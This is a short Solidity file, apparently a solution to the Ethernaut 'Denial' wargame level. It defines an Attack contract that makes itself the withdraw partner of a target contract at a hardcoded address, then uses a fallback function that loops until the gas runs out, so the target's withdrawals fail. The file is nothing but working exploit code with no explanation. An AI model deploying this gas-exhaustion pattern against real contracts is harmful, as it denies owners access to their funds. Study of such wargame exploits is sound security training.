// SPDX-License-Identifier: none
pragma solidity ^0.8.0;

interface Denial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
    function contractBalance() external returns (uint);
}
contract Attack {
    function attack() public {
        Denial denial = Denial(0x860a86f0038Fe4Ba6ce24c6eBC2b8BD901D7a26e);
        denial.setWithdrawPartner(address(this));
        denial.withdraw();
    }

    fallback() external payable {
        Denial denial = Denial(0x860a86f0038Fe4Ba6ce24c6eBC2b8BD901D7a26e);
        uint i;
        uint start = gasleft();
        while (gasleft() <= start) {
            i++;
        }
    }
}